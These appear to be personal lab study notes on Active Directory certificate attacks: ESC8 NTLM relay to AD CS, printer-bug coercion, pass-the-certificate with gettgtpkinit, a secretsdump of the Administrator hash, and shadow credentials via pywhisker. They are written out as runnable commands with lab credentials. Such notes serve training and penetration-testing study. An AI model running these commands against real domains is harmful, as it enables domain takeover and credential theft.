PKINIT, short for Public Key Cryptography for Initial Authentication, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange.


Pass-the-Certificate refers to the technique of using X.509 certificates to successfully obtain Ticket Granting Tickets (TGTs).


This method is used for attacks against Active Directory Certificate Services
AS WELL AS Shadow Credential attacks.



AD CS NTLM Relay Attack (ESC8)
ESC8—as described in the Certified Pre-Owned paper—is an NTLM relay attack targeting an ADCS HTTP endpoint.

HOW TO PERFORM:
use Impacket's ntlmrelayx to listen for inbound connections and relay them to the service.

impacket-ntlmrelayx -t http://<target-ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication


PRINTER SPOOLER SERVICE (kerberos):
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
^ Usually you will have to wait for the target to attempt authentication, but you can also force the target/coerce the target:

usage: printerbug.py [-h] [-target-file file] [-port [destination port]]
                     [-hashes LMHASH:NTHASH] [-no-pass]
                     target attackerhost

python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12




GETTGTPKINIT.PY (PASS-THE-CERTIFICATE)
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
 python3 -m venv .venv	
 source .venv/bin/activate
 pip3 install -r requirements.txt

 ("Error detecting the version of libcrypto" can be fixed w/ pip3 install -I git+https://github.com/wbond/oscrypto.git)

 python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

 (should now have the tgt)
 export KRB5CCNAME=/tmp/dc.ccache
 impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

^ (if having trouble above, it's probably because you didn't add the subdomain to  the /etc/hosts)



SHADOW CREDENTIALS (msDS-KeyCredentialLink)
abuses the msDS-KeyCredentialLink attribute of the target, which stored public keys used for auth via pkinit.

pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

when a PFX file is created:
ython3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

and then we can pass the ticket:
export KRB5CCNAME=/tmp/jpinkman.ccache
